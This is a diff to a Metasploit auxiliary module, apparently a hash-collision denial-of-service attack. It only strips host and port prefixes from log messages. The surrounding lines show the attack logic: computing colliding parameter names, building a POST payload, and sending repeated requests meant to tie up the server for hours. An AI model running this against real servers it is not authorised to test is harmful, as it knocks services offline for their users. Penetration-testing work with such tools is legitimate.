@@ -84,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
     post = ''
     max_value_float = size**length
     max_value_int = max_value_float.floor
-    print_status("#{rhost}:#{rport} - Generating POST data...")
+    print_status("Generating POST data...")
     for i in 0.upto(max_value_int)
       input_string = i.to_s(size)
       result = input_string.rjust(length, '0')
@@ -97,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def compute_collision_chars
-    print_status("#{rhost}:#{rport} - Trying to find hashes...") if @recursive_counter == 1
+    print_status("Trying to find hashes...") if @recursive_counter == 1
     hashes = {}
     counter = 0
     length = datastore['CollisionCharLength']
@@ -133,18 +133,18 @@ class MetasploitModule < Msf::Auxiliary
     if counter < datastore['CollisionChars']
       # Try it again
       if @recursive_counter > datastore['RecursiveMax']
-        print_error("#{rhost}:#{rport} - Not enough values found. Please start this script again.")
+        print_error("Not enough values found. Please start this script again.")
         return nil
       end
-      print_status("#{rhost}:#{rport} - #{@recursive_counter}: Not enough values found. Trying again...")
+      print_status("#{@recursive_counter}: Not enough values found. Trying again...")
       @recursive_counter += 1
       hashes = compute_collision_chars
     else
-      print_status("#{rhost}:#{rport} - Found values:")
+      print_status("Found values:")
       hashes.each_value do |item|
-        print_status("#{rhost}:#{rport} -\tValue: #{item}\tHash: #{@function.call(item)}")
+        print_status("\tValue: #{item}\tHash: #{@function.call(item)}")
         item.each_char do |c|
-          print_status("#{rhost}:#{rport} -\t\tValue: #{c}\tCharcode: #{c.unpack('C')}")
+          print_status("\t\tValue: #{c}\tCharcode: #{c.unpack('C')}")
         end
       end
     end
@@ -190,7 +190,7 @@ class MetasploitModule < Msf::Auxiliary
       raise "Target #{datastore['TARGET']} not supported"
     end
 
-    print_status("#{rhost}:#{rport} - Generating payload...")
+    print_status("Generating payload...")
     payload = generate_payload
     return if payload.nil?
 
@@ -200,10 +200,10 @@ class MetasploitModule < Msf::Auxiliary
     # remove last invalid(cut off) parameter
     position = payload.rindex('=&')
     payload = payload[0, position + 1]
-    print_status("#{rhost}:#{rport} -Payload generated")
+    print_status("Payload generated")
 
     for x in 1..datastore['RLIMIT']
-      print_status("#{rhost}:#{rport} - Sending request ##{x}...")
+      print_status("Sending request ##{x}...")
       opts = {
         'method'	=> 'POST',
         'uri'	=> normalize_uri(datastore['URL']),
@@ -215,7 +215,7 @@ class MetasploitModule < Msf::Auxiliary
         c.send_request(r)
         # Don't wait for a response, can take hours
       rescue ::Rex::ConnectionError => e
-        print_error("#{rhost}:#{rport} - Unable to connect: '#{e.message}'")
+        print_error("Unable to connect: '#{e.message}'")
         return
       ensure
         disconnect(c) if c
